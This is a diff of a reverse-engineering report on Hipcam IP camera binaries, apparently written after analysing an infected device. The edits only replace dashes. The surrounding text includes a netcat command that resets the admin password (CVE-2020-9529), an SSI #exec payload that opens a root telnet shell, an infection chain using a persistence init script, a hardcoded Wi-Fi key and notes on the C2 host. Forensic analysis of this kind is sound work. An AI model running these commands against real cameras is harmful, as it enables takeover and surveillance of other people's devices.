@@ -1,4 +1,4 @@
-# Reverse Engineering Report — Hipcam IP Camera Binaries
+# Reverse Engineering Report - Hipcam IP Camera Binaries
 
 ## Binaries Analyzed
 
@@ -11,7 +11,7 @@
 
 ---
 
-## ipc_server — Critical Findings
+## ipc_server - Critical Findings
 
 ### Attack Surface
 - **182 CGI endpoints** exposed via HTTP (port 80)
@@ -68,7 +68,7 @@ Authentication: ZTEALE234=2opWae   HDS/1.0 second auth factor
 ```
 libcrypto.so.1.0.0  (OpenSSL)
 libssl.so.1.0.0     (SSL/TLS)
-libiniparser.so     (INI config — NOT stripped, has debug info!)
+libiniparser.so     (INI config - NOT stripped, has debug info!)
 libNetLib.so        (Network library)
 libXqAPILib.so      (XQ P2P cloud)
 libxqun.so           (XQ P2P client)
@@ -76,7 +76,7 @@ libxqun.so           (XQ P2P client)
 
 ---
 
-## onvif — Critical Findings
+## onvif - Critical Findings
 
 ### Process Execution Capability
 
@@ -132,18 +132,18 @@ Note: compiled with **HiSilicon** toolchain (different from Goke's GCC 4.6.1). T
 
 ---
 
-## watchdog — Simple Hardware Monitor
+## watchdog - Simple Hardware Monitor
 
 - Opens `/dev/watchdog`
 - Feeds it via `ioctl()` in a loop
 - If feeding fails → prints error, aborts
-- Not stripped — has debug symbols
+- Not stripped - has debug symbols
 - No network interaction, no command execution
 - **Not exploitable**
 
 ---
 
-## chksock — Connection Checker
+## chksock - Connection Checker
 
 - Reads `/proc/net/tcp` to check socket states
 - Looks for "CLOSE WAIT" state
@@ -190,16 +190,16 @@ Note: compiled with **HiSilicon** toolchain (different from Goke's GCC 4.6.1). T
 
 ## Confirmed Exploits
 
-### CVE-2020-9529 — Unauthenticated Admin Password Reset
-**Severity: CRITICAL (CVSS 9.8) — CONFIRMED WORKING on this camera**
+### CVE-2020-9529 - Unauthenticated Admin Password Reset
+**Severity: CRITICAL (CVSS 9.8) - CONFIRMED WORKING on this camera**
 
 ```
 echo -ne 'CMD * HDS/1.0\r\nusrpwd set -resetpwd on\r\n\r\n' | nc -u 192.168.1.10 12222
 ```
 Response: `[Success]usrpwd reset!`. Admin password reset to `admin`. Camera reboots.
 
-### SSI #exec Command Injection — RCE as root
-**Severity: CRITICAL — ipc_server supports Server-Side Includes with shell execution**
+### SSI #exec Command Injection - RCE as root
+**Severity: CRITICAL - ipc_server supports Server-Side Includes with shell execution**
 
 The web server parses `<!--#exec cmd="...">` directives:
 ```
@@ -214,23 +214,23 @@ Error strings confirm the server tries to execute the command via `popen()` or `
 <!--#exec cmd="telnetd -l /bin/sh &"-->
 ```
 
-### Infection Vector — Confirmed
+### Infection Vector - Confirmed
 1. Attacker sends CVE-2020-9529 → resets admin password to `admin`
 2. Logs into web panel with `admin`/`admin`  
 3. Uses SSI `#exec` injection on .shtml page → writes malware to `/etc/init.d/S98test`
 4. OR: Uses CGI with path traversal to write `../../tmpfs/hacked.txt`
 5. Camera reboots → malware active
 
-**Evidence:** `config_devtypese.ini` has `product = "../../tmpfs/hacked.txt"` — path traversal attack remnant confirming the second variant.
+**Evidence:** `config_devtypese.ini` has `product = "../../tmpfs/hacked.txt"` - path traversal attack remnant confirming the second variant.
 
-### libNetLib.so — Command Execution Library
+### libNetLib.so - Command Execution Library
 The shared library loaded by both ipc_server and onvif contains:
-- `HI_Execv`, `HI_Execvp`, `HI_Fork` — process execution wrappers
-- `HI_OpenTcp`, `HI_SocketConnect` — network functions
+- `HI_Execv`, `HI_Execvp`, `HI_Fork` - process execution wrappers
+- `HI_OpenTcp`, `HI_SocketConnect` - network functions
 - Packaged as ZIP (anti-RE), extracted to tmpfs at boot
 
 ### WiFi AP Hardcoded Key
-WiFi AP mode sets SSID `IPCAM-<uuid_suffix>` with **WPA2 key `01234567`** — allows proximity access to the camera's network.
+WiFi AP mode sets SSID `IPCAM-<uuid_suffix>` with **WPA2 key `01234567`** - allows proximity access to the camera's network.
 
 ---
 
@@ -279,24 +279,24 @@ Full startup chain reconstructed from init scripts:
 ```
 Kernel → /sbin/init → /etc/inittab → /etc/init.d/rcS
   │
-  ├─ S10mdev        — Device nodes (mdev -s)
-  ├─ S11devnode     — Creates /dev/encript (mknod c 244 0, mode 666)
-  ├─ S90ipc         — Sets lo + eth0, runs /mnt/mtd/ipc/run &
-  └─ S98test         — CLEAN (exit 0, was malware)
+  ├─ S10mdev        - Device nodes (mdev -s)
+  ├─ S11devnode     - Creates /dev/encript (mknod c 244 0, mode 666)
+  ├─ S90ipc         - Sets lo + eth0, runs /mnt/mtd/ipc/run &
+  └─ S98test         - CLEAN (exit 0, was malware)
         │
         ▼
 /mnt/mtd/ipc/run (main orchestrator):
-  ├─ load_drv       — insmod MT7601U WiFi + encript.ko + gkio.ko
-  ├─ load_media     — Loads sensor driver (SC1145/GC1024/AR0130)
-  ├─ start.g711     — Audio codec init
-  ├─ ipc_server     — Main HTTP/RTSP/CGI server
-  ├─ watchdog       — Hardware watchdog
-  ├─ net_detect     — Network connectivity monitor
-  ├─ sd.sh          — SD card mount + recording
-  ├─ upnp_map       — UPnP port mapping
-  ├─ platform.sh    — Waits for ipc_server, then starts onvif (if enabled)
-  ├─ loadp2p.sh     — P2P cloud client
-  └─ telnetd         — ADDED for persistence
+  ├─ load_drv       - insmod MT7601U WiFi + encript.ko + gkio.ko
+  ├─ load_media     - Loads sensor driver (SC1145/GC1024/AR0130)
+  ├─ start.g711     - Audio codec init
+  ├─ ipc_server     - Main HTTP/RTSP/CGI server
+  ├─ watchdog       - Hardware watchdog
+  ├─ net_detect     - Network connectivity monitor
+  ├─ sd.sh          - SD card mount + recording
+  ├─ upnp_map       - UPnP port mapping
+  ├─ platform.sh    - Waits for ipc_server, then starts onvif (if enabled)
+  ├─ loadp2p.sh     - P2P cloud client
+  └─ telnetd         - ADDED for persistence
 ```
 
 ---
@@ -314,10 +314,10 @@ Server:    EKPNAUENAOIFSWSQL...-$$ (encrypted, 109 chars, custom XQ cipher)
 The XQP2P server address is encrypted with a custom encoding (A-Z only alphabet, not base64). The P2P library (libXqAPILib.so / libxqun.so) decrypts this at runtime to establish cloud connectivity.
 
 ### Push Notifications (config_alarm_token.ini)
-64 push token slots — ALL empty, ALL disabled. No active push notifications configured.
+64 push token slots - ALL empty, ALL disabled. No active push notifications configured.
 
 ### Linked Devices (config_devices.ini)
-9 device slots — ALL empty. Camera is not linked to any other cameras.
+9 device slots - ALL empty. Camera is not linked to any other cameras.
 
 ### Factory Credentials (config_priv.ini)
 ```
@@ -335,7 +335,7 @@ Device ID:     "test"
 - CVE-2012-6708: XSS via `.html()` with unsanitized input
 - CVE-2015-9251: XSS via `$.parseHTML()` with crafted input
 
-### validate.js Bug — Undefined Function
+### validate.js Bug - Undefined Function
 ```javascript
 function checkProhibitedCharacter(string) {
     // blocks:  &  =  cmd=  in usernames
@@ -369,13 +369,13 @@ Reverse DNS:      srv1403979.hstgr.cloud (Hostinger)
 ### Hosting Details
 ```
 Provider:    Hostinger (hostinger.com)
-Platform:    IPXO (IP leasing — used to rent cheap IPs anonymously)
+Platform:    IPXO (IP leasing - used to rent cheap IPs anonymously)
 Route:       86.38.202.0/23
 Location:    US (AS48031)
 WHOIS Org:   SC "Lithuanian Radio and TV Center" (IPXO reseller)
 ```
 
-The C2 was a cheap Hostinger VPS rented through an IP leasing platform. This explains why `/bin/omm` didn't exist on the camera — the C2 went offline at some point, downloads failed, and the runner loop kept trying unsuccessfully.
+The C2 was a cheap Hostinger VPS rented through an IP leasing platform. This explains why `/bin/omm` didn't exist on the camera - the C2 went offline at some point, downloads failed, and the runner loop kept trying unsuccessfully.
 
 ### Inferences
 - **Low-budget operation:** Hostinger shared hosting is ~$2-5/month
